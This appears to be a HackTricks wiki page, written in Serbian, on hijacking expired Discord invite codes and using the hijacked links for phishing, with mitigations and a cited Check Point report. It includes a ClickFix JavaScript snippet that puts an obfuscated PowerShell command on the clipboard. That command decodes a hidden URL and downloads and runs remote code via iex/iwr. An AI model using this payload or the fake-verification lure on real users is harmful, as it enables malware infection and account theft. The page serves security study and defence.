# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Ranljivost Discord-ovog sistema za poziv omogućava pretnjama da preuzmu istekao ili obrisan pozivni kod (privremeni, trajni ili prilagođeni) kao nove prilagođene linkove na bilo kojem serveru sa Level 3 pojačanjem. Normalizovanjem svih kodova na mala slova, napadači mogu unapred registrovati poznate pozivne kodove i tiho preuzeti saobraćaj kada originalni link istekne ili kada izvorni server izgubi svoje pojačanje.

## Tipovi poziva i rizik od preuzimanja

| Tip poziva            | Moguće preuzimanje? | Uslov / Komentari                                                                                       |
|-----------------------|---------------------|---------------------------------------------------------------------------------------------------------|
| Privremeni pozivni link | ✅                  | Nakon isteka, kod postaje dostupan i može se ponovo registrovati kao prilagođeni URL od strane pojačanog servera. |
| Trajni pozivni link   | ⚠️                  | Ako je obrisan i sastoji se samo od malih slova i cifara, kod može ponovo postati dostupan.            |
| Prilagođeni link      | ✅                  | Ako izvorni server izgubi svoje Level 3 pojačanje, njegov prilagođeni poziv postaje dostupan za novu registraciju. |

## Koraci eksploatacije

1. Istraživanje
- Pratite javne izvore (forume, društvene mreže, Telegram kanale) za pozivne linkove koji odgovaraju obrascu `discord.gg/{code}` ili `discord.com/invite/{code}`.
- Prikupite pozivne kodove od interesa (privremene ili prilagođene).
2. Pre-registration
- Kreirajte ili koristite postojeći Discord server sa privilegijama Level 3 pojačanja.
- U **Podešavanja servera → Prilagođeni URL**, pokušajte da dodelite ciljni pozivni kod. Ako bude prihvaćen, kod je rezervisan od strane zlonamernog servera.
3. Aktivacija preuzimanja
- Za privremene pozive, sačekajte da originalni poziv istekne (ili ga ručno obrišite ako kontrolišete izvor).
- Za kodove koji sadrže velika slova, varijanta sa malim slovima može se odmah preuzeti, iako preusmeravanje aktivira tek nakon isteka.
4. Tiho preusmeravanje
- Korisnici koji posete stari link se neprimetno šalju na server pod kontrolom napadača kada je preuzimanje aktivno.

## Phishing tok putem Discord servera

1. Ograničite kanale servera tako da je vidljiv samo **#verify** kanal.
2. Postavite bota (npr. **Safeguard#0786**) da podstakne novajlije da se verifikuju putem OAuth2.
3. Bot preusmerava korisnike na phishing sajt (npr. `captchaguard.me`) pod izgovorom CAPTCHA ili koraka verifikacije.
4. Implementirajte **ClickFix** UX trik:
- Prikazujte poruku o pokvarenom CAPTCHA.
- Uputite korisnike da otvore **Win+R** dijalog, nalepite unapred učitanu PowerShell komandu i pritisnite Enter.

### ClickFix Primer ubrizgavanja u međuspremnik
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Ovaj pristup izbegava direktno preuzimanje fajlova i koristi poznate UI elemente kako bi smanjio sumnju korisnika.

## Mitigacije

- Koristite trajne pozivnice koje sadrže barem jedno veliko slovo ili ne-alfanumerički karakter (nikada ne isteknu, ne mogu se ponovo koristiti).
- Redovno menjajte pozivne kodove i opozovite stare linkove.
- Pratite status pojačanja Discord servera i tvrdnje o vanity URL-ovima.
- Obrazujte korisnike da verifikuju autentičnost servera i izbegavaju izvršavanje komandi koje su kopirane iz međuspremnika.

## Reference

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
- Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link

{{#include ../../banners/hacktricks-training.md}}
